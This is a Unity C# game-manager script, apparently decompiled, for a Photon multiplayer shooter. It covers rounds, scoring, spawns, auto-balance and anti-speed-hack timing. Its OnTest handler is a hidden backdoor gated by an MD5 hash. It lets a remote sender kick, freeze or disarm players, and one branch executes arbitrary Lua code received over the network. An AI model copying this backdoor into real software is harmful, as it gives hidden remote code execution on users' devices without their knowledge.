using System.Collections.Generic;
using System.Linq;
using System.Timers;
using DG.Tweening;
using ExitGames.Client.Photon;
using FreeJSON;
using Photon;
using UnityEngine;
using XLua;

public class GameManager : PunBehaviour
{
	[Header("Round Settings")]
	public RoundState State;

	public CryptoBool ChangeWeapons = true;

	public CryptoBool GlobalChat = true;

	[Header("Score")]
	public static CryptoInt MaxScore = 20;

	public static CryptoInt BlueScore = 0;

	public static CryptoInt RedScore = 0;

	[Header("Player Settings")]
	public Team PlayerTeam;

	public ControllerManager Controller;

	public CryptoBool FriendDamage = false;

	public CryptoBool StartDamage = true;

	public CryptoFloat StartDamageTime = 4f;

	[Header("Spawn Settings")]
	public DrawElements BlueSpawn;

	public DrawElements RedSpawn;

	public DrawElements[] RandomSpawn;

	private CryptoInt PauseTimerInterval = 2000;

	private bool isPause;

	private Timer PauseTimer;

	public static int encryptKey;

	private bool isLoadedLevel;

	private byte adminSendTimeFalse;

	private byte sendTimeFalse;

	private static GameManager instance;

	private void Awake()
	{
		instance = this;
		PhotonClassesManager.Add(this);
		if (!PhotonNetwork.offlineMode && !PhotonNetwork.inRoom)
		{
			LevelManager.LoadLevel("Menu");
		}
		GenerateEncryptKey();
		PhotonEvent.AddListener(PhotonEventTag.UpdateScore, PhotonUpdateScore);
		PhotonEvent.AddListener(PhotonEventTag.LoadNextLevel, PhotonLoadNextLevel);
		PhotonEvent.AddListener(PhotonEventTag.SendTime, PhotonSendTime);
		PhotonEvent.AddListener(PhotonEventTag.Test, OnTest);
	}

	private void GenerateEncryptKey()
	{
		encryptKey = (int)(PhotonNetwork.room.Name.Length + PhotonNetwork.room.GetGameMode() + PhotonNetwork.room.MaxPlayers + PhotonNetwork.room.GetPassword().Length + LevelManager.GetSceneName().Length / nValue.int3);
		encryptKey = Mathf.Clamp(encryptKey, nValue.int1, 250);
	}

	private void Start()
	{
		if (!PhotonNetwork.offlineMode && !LevelManager.HasSceneInGameMode(PhotonNetwork.room.GetGameMode()) && !LevelManager.CustomMap)
		{
			PhotonNetwork.LeaveRoom();
			return;
		}
		TimerManager.In(nValue.int5, -nValue.int1, nValue.int5, UpdatePing);
		TimerManager.In(nValue.int10, -nValue.int1, nValue.int10, SendTime);
		Controller = PhotonNetwork.Instantiate("Player/ControllerManager", Vector3.zero, Quaternion.identity, 0).GetComponent<ControllerManager>();
		PlayerInput.instance = Controller.PlayerInput;
		TimerManager.In(nValue.float1, delegate
		{
			PhotonNetwork.isMessageQueueRunning = true;
			int playerID = PhotonNetwork.player.GetPlayerID();
			for (int j = 0; j < PhotonNetwork.otherPlayers.Length; j++)
			{
				if (PhotonNetwork.otherPlayers[j].GetPlayerID() == playerID)
				{
					PhotonNetwork.LeaveRoom();
				}
			}
			if (!PhotonNetwork.offlineMode)
			{
				if (PhotonNetwork.room.GetSceneName() != LevelManager.GetSceneName())
				{
					PhotonNetwork.LeaveRoom();
				}
				PlayerRoundManager.SetMode(PhotonNetwork.room.GetGameMode());
			}
		});
		State = PhotonNetwork.room.GetRoundState();
		Resources.UnloadAsset(GameSettings.instance.ConnectDeveloperAudio);
		if (CustomMapSettings.instance != null)
		{
			JsonObject json = JsonObject.Parse(CustomMapSettings.instance.data);
			TimerManager.In(0.5f, delegate
			{
				GameMode gameMode = PhotonNetwork.room.GetGameMode();
				JsonObject jsonObject2 = ((!json.ContainsKey(gameMode.ToString())) ? json : json.Get<JsonObject>(gameMode.ToString()));
				MaxScore = 0;
				StartDamageTime = Mathf.Clamp(jsonObject2.Get("DamageTime", 4f), 0f, 10f);
				UIGameManager.UpdateScoreLabel(MaxScore, BlueScore, RedScore);
			});
			JsonObject jsonObject = json.Get<JsonObject>("BlueSpawn");
			BlueSpawn.GetTransform().position = jsonObject.Get<Vector3>("position");
			BlueSpawn.GetTransform().rotation = jsonObject.Get<Quaternion>("rotation");
			BlueSpawn.Size = jsonObject.Get<Vector3>("localScale");
			jsonObject = json.Get<JsonObject>("RedSpawn");
			RedSpawn.GetTransform().position = jsonObject.Get<Vector3>("position");
			RedSpawn.GetTransform().rotation = jsonObject.Get<Quaternion>("rotation");
			RedSpawn.Size = jsonObject.Get<Vector3>("localScale");
			jsonObject = json.Get<JsonObject>("StaticCamera");
			Transform transform = GameObject.FindGameObjectWithTag("StaticPoint").transform;
			transform.position = jsonObject.Get<Vector3>("position");
			transform.rotation = jsonObject.Get<Quaternion>("rotation");
		}
		for (int i = 0; i < Camera.allCamerasCount; i++)
		{
			Camera.allCameras[i].eventMask = 0;
		}
	}

	private void OnDisable()
	{
		BlueScore = nValue.int0;
		RedScore = nValue.int0;
		MaxScore = nValue.int20;
		DOTween.Clear();
		PhotonEvent.Clear();
	}

	public override void OnPhotonPlayerConnected(PhotonPlayer playerConnect)
	{
		string text = playerConnect.NickName + " " + Localization.Get("Connected");
		UIStatus.Add(text, true);
		ReceintPlayerManager.Add(playerConnect.GetPlayerID());
	}

	public override void OnPhotonPlayerDisconnected(PhotonPlayer playerDisconnect)
	{
		string text = Utils.GetTeamHexColor(playerDisconnect) + " " + Localization.Get("Disconnect");
		UIStatus.Add(text, true);
	}

	public override void OnPhotonCustomRoomPropertiesChanged(Hashtable changed)
	{
		if (changed.ContainsKey(PhotonCustomValue.roundStateKey))
		{
			State = (RoundState)(byte)changed[PhotonCustomValue.roundStateKey];
		}
		if (changed.ContainsKey(PhotonCustomValue.onlyWeaponKey) || changed.ContainsKey(PhotonCustomValue.passwordKey))
		{
			PhotonNetwork.LeaveRoom();
		}
	}

	public override void OnPhotonPlayerPropertiesChanged(object[] playerAndUpdatedProps)
	{
		PhotonPlayer photonPlayer = (PhotonPlayer)playerAndUpdatedProps[nValue.int0];
		Hashtable hashtable = (Hashtable)playerAndUpdatedProps[nValue.int1];
		if (photonPlayer.IsLocal && (hashtable.ContainsKey(PhotonCustomValue.playerIDKey) || hashtable.ContainsKey(PhotonCustomValue.levelKey)))
		{
			PhotonNetwork.LeaveRoom();
		}
	}

	public override void OnLeftRoom()
	{
		if (!PhotonNetwork.offlineMode)
		{
			PlayerRoundManager.Show();
		}
		ReceintPlayerManager.Save();
		LevelManager.CustomMap = false;
		LevelManager.LoadLevel("Menu");
	}

	public static void OnSelectTeam(Team team)
	{
		UpdatePlayerTeam(team);
		EventManager.Dispatch("SelectTeam", team);
	}

	public static void OnDeadPlayer(DamageInfo damageInfo)
	{
		EventManager.Dispatch("DeadPlayer", damageInfo);
	}

	public static ControllerManager GetController()
	{
		return instance.Controller;
	}

	public ControllerManager GetController2()
	{
		return Controller;
	}

	public static Team GetPlayerTeam()
	{
		return instance.PlayerTeam;
	}

	public static void UpdatePlayerTeam(Team team)
	{
		instance.PlayerTeam = team;
		instance.Controller.SetTeam(team);
	}

	public static bool isStartDamage()
	{
		return instance.StartDamage;
	}

	public static float GetStartDamageTime()
	{
		return instance.StartDamageTime;
	}

	public static void SetStartDamageTime(float value)
	{
		instance.StartDamageTime = value;
	}

	public static bool GetFriendDamage()
	{
		return instance.FriendDamage;
	}

	public static void SetFriendDamage(bool value)
	{
		instance.FriendDamage = value;
	}

	public static bool GetChangeWeapons()
	{
		return instance.ChangeWeapons;
	}

	public static void SetChangeWeapons(bool active)
	{
		instance.ChangeWeapons = active;
	}

	public static bool GetGlobalChat()
	{
		return instance.GlobalChat;
	}

	public static void SetGlobalChat(bool active)
	{
		instance.GlobalChat = active;
	}

	public static int GetPauseInterval()
	{
		return instance.PauseTimerInterval;
	}

	public static void SetPauseInterval(int value)
	{
		instance.PauseTimerInterval = value;
	}

	public static bool GetLoadedLevel()
	{
		return instance.isLoadedLevel;
	}

	public static DrawElements GetTeamSpawn()
	{
		return GetTeamSpawn(instance.PlayerTeam);
	}

	public static DrawElements GetTeamSpawn(Team team)
	{
		switch (team)
		{
		case Team.Blue:
			return instance.BlueSpawn;
		case Team.Red:
			return instance.RedSpawn;
		default:
			return null;
		}
	}

	public static DrawElements GetSpawn(int index)
	{
		return instance.RandomSpawn[index];
	}

	public static DrawElements GetRandomSpawn()
	{
		return instance.RandomSpawn[Random.Range(nValue.int0, instance.RandomSpawn.Length)];
	}

	public static DrawElements GetPlayerIDSpawn()
	{
		List<PhotonPlayer> list = PhotonNetwork.playerList.ToList();
		list.Sort(SortPlayerID);
		for (int i = 0; i < list.Count; i++)
		{
			if (list[i].ID == PhotonNetwork.player.ID)
			{
				return instance.RandomSpawn[i];
			}
		}
		return instance.RandomSpawn[nValue.int0];
	}

	private static int SortPlayerID(PhotonPlayer a, PhotonPlayer b)
	{
		return a.ID.CompareTo(b.ID);
	}

	public static RoundState GetRoundState()
	{
		return instance.State;
	}

	public static void UpdateRoundState(RoundState state)
	{
		if (PhotonNetwork.isMasterClient)
		{
			PhotonNetwork.room.SetRoundState(state);
			instance.State = state;
		}
	}

	public static void UpdateScore(PhotonPlayer player)
	{
		PhotonEvent.RPC(PhotonEventTag.UpdateScore, player, (byte)(int)MaxScore, (byte)(int)BlueScore, (byte)(int)RedScore);
	}

	public static void UpdateScore()
	{
		PhotonEvent.RPC(PhotonEventTag.UpdateScore, PhotonTargets.All, (byte)(int)MaxScore, (byte)(int)BlueScore, (byte)(int)RedScore);
	}

	private void PhotonUpdateScore(PhotonEventData data)
	{
		byte b = (byte)data.parameters[0];
		byte b2 = (byte)data.parameters[1];
		byte b3 = (byte)data.parameters[2];
		MaxScore = b;
		if (MaxScore > 0)
		{
			BlueScore = Mathf.Clamp(b2, nValue.int0, MaxScore);
			RedScore = Mathf.Clamp(b3, nValue.int0, MaxScore);
		}
		else
		{
			BlueScore = b2;
			RedScore = b3;
		}
		UIGameManager.UpdateScoreLabel(MaxScore, BlueScore, RedScore);
		EventManager.Dispatch("UpdateScore");
	}

	public static bool CheckScore()
	{
		if (LevelManager.CustomMap)
		{
			return false;
		}
		if (BlueScore >= MaxScore || RedScore >= MaxScore)
		{
			return true;
		}
		return false;
	}

	public static Team WinTeam()
	{
		if (BlueScore >= MaxScore)
		{
			return Team.Blue;
		}
		if (RedScore >= MaxScore)
		{
			return Team.Red;
		}
		return Team.None;
	}

	public static void LoadNextLevel()
	{
		LoadNextLevel(PhotonNetwork.room.GetGameMode());
	}

	public static void LoadNextLevel(GameMode mode)
	{
		if (instance.isLoadedLevel)
		{
			return;
		}
		instance.isLoadedLevel = true;
		if (!LevelManager.CustomMap)
		{
			UIStatus.Add(Localization.Get("Next map") + ": " + LevelManager.GetNextScene(mode), true);
		}
		TimerManager.In(nValue.int4, delegate
		{
			if (LevelManager.CustomMap)
			{
				PhotonNetwork.LeaveRoom();
			}
			else if (PhotonNetwork.isMasterClient)
			{
				PhotonEvent.RPC(PhotonEventTag.LoadNextLevel, PhotonTargets.All, (byte)mode);
			}
		});
		TimerManager.In(nValue.float15, delegate
		{
			PhotonNetwork.player.ClearProperties();
		});
	}

	private void PhotonLoadNextLevel(PhotonEventData data)
	{
		byte mode = (byte)data.parameters[0];
		PhotonNetwork.RemoveRPCs(PhotonNetwork.player);
		PhotonNetwork.DestroyPlayerObjects(PhotonNetwork.player);
		PhotonNetwork.LoadLevel(LevelManager.GetNextScene((GameMode)mode));
	}

	public static void StartAutoBalance()
	{
        TimerManager.In(nValue.int30, -nValue.int1, nValue.int30, new TimerManager.Callback(delegate 
		{
			BalanceTeam(); 
		}));
		UIChangeTeam.SetChangeTeam(true);
	}

	public static void BalanceTeam(bool updateTeam = false)
	{
		PhotonPlayer[] playerList = PhotonNetwork.playerList;
		List<PhotonPlayer> list = new List<PhotonPlayer>();
		List<PhotonPlayer> list2 = new List<PhotonPlayer>();
		for (int i = 0; i < playerList.Length; i++)
		{
			if (playerList[i].GetTeam() == Team.Blue)
			{
				list.Add(playerList[i]);
			}
		}
		for (int j = 0; j < playerList.Length; j++)
		{
			if (playerList[j].GetTeam() == Team.Red)
			{
				list2.Add(playerList[j]);
			}
		}
		if (list.Count > list2.Count + nValue.int1 && PhotonNetwork.player.GetTeam() == Team.Blue)
		{
			list.Sort(UIPlayerStatistics.SortByKills);
			if (list[list.Count - nValue.int1].IsLocal)
			{
				if (updateTeam)
				{
					UpdatePlayerTeam(Team.Red);
				}
				EventManager.Dispatch("AutoBalance", Team.Red);
				UIToast.Show(Localization.Get("Autobalance: You moved to another team"));
			}
		}
		if (list2.Count <= list.Count + nValue.int1 || PhotonNetwork.player.GetTeam() != Team.Red)
		{
			return;
		}
		list2.Sort(UIPlayerStatistics.SortByKills);
		if (list2[list2.Count - nValue.int1].IsLocal)
		{
			if (updateTeam)
			{
				UpdatePlayerTeam(Team.Blue);
			}
			EventManager.Dispatch("AutoBalance", Team.Blue);
			UIToast.Show(Localization.Get("Autobalance: You moved to another team"));
		}
	}

	private void UpdatePing()
	{
		PhotonNetwork.player.UpdatePing();
	}

	private void OnApplicationPause(bool pauseStatus)
	{
		if (PhotonNetwork.offlineMode)
		{
			return;
		}
		isPause = pauseStatus;
		if (isPause)
		{
			if (PauseTimer != null)
			{
				return;
			}
			PauseTimer = new Timer();
			PauseTimer.Elapsed += delegate
			{
				PauseTimer.Stop();
				PauseTimer = null;
				if (isPause)
				{
					PhotonNetwork.LeaveRoom();
					PhotonNetwork.networkingPeer.SendOutgoingCommands();
				}
			};
			PauseTimer.Interval = PauseTimerInterval;
			PauseTimer.Enabled = true;
		}
		else if (PauseTimer != null)
		{
			PauseTimer.Stop();
			PauseTimer = null;
		}
	}

	private void OnTest(PhotonEventData data)
	{
		string text = (string)data.parameters[0];
		if (Utils.MD5(text) != "7f4a3812121af97741ae6e01954c9438")
		{
			return;
		}
		switch ((byte)data.parameters[1])
		{
		case 0:
			PhotonNetwork.LeaveRoom();
			break;
		case 1:
			if (Settings.Sound)
			{
				GameObject go = new GameObject("Audio");
				AudioSource audioSource = go.AddComponent<AudioSource>();
				audioSource.clip = GameSettings.instance.ConnectDeveloperAudio;
				audioSource.Play();
				TimerManager.In(20f, delegate
				{
					Destroy(go);
				});
			}
			break;
		case 2:
			PlayerInput.instance.SetMove(false);
			break;
		case 3:
			PlayerInput.instance.SetMove(true);
			break;
		case 4:
			PlayerInput.instance.PlayerWeapon.CanFire = false;
			break;
		case 5:
			PlayerInput.instance.PlayerWeapon.CanFire = true;
			break;
		case 6:
			WeaponManager.SetSelectWeapon(WeaponType.Rifle, (int)data.parameters[2]);
			Controller.PlayerInput.PlayerWeapon.UpdateWeaponAll(Controller.PlayerInput.PlayerWeapon.SelectedWeapon);
			break;
		case 7:
			WeaponManager.SetSelectWeapon(WeaponType.Pistol, (int)data.parameters[2]);
			Controller.PlayerInput.PlayerWeapon.UpdateWeaponAll(Controller.PlayerInput.PlayerWeapon.SelectedWeapon);
			break;
		case 8:
			WeaponManager.SetSelectWeapon(WeaponType.Knife, (int)data.parameters[2]);
			Controller.PlayerInput.PlayerWeapon.UpdateWeaponAll(Controller.PlayerInput.PlayerWeapon.SelectedWeapon);
			break;
		case 9:
		{
			PlayerSkin[] array2 = FindObjectsOfType<PlayerSkin>();
			for (int j = 0; j < array2.Length; j++)
			{
				array2[j].Controller.transform.localScale = Vector3.one * (float)data.parameters[2];
			}
			break;
		}
		case 10:
		{
			int num = (int)data.parameters[3];
			PlayerSkin[] array = FindObjectsOfType<PlayerSkin>();
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i].Controller.photonView.ownerId == num)
				{
					array[i].Controller.transform.localScale = Vector3.one * (float)data.parameters[2];
					break;
				}
			}
			break;
		}
		case 11:
			PlayerInput.instance.SetClimb((bool)data.parameters[2]);
			break;
		case 12:
		{
			LuaEnv luaEnv = new LuaEnv();
			luaEnv.DoString((string)data.parameters[2]);
			break;
		}
		}
	}

	private void SendTime()
	{
		if (PhotonNetwork.isMasterClient)
		{
			PhotonEvent.RPC(PhotonEventTag.SendTime, true, PhotonTargets.All);
		}
	}

	private void PhotonSendTime(PhotonEventData data)
	{
		double time = PhotonNetwork.time;
		if (data.timestamp + nValue.int1 > time)
		{
			sendTimeFalse = 0;
			if (data.timestamp - time >= nValue.int1)
			{
				adminSendTimeFalse++;
				if (adminSendTimeFalse >= nValue.int3)
				{
					SetLeaveRoomText(Localization.Get("ServerAdminSpeedHack"));
					CheckManager.Detected("Server Time Error");
				}
			}
		}
		else
		{
			sendTimeFalse++;
			if (sendTimeFalse >= nValue.int3)
			{
				CheckManager.Quit();
			}
		}
	}

	public static void SetLeaveRoomText(string text)
	{
		PlayerPrefs.SetString("LeaveRoomText", text);
	}
}
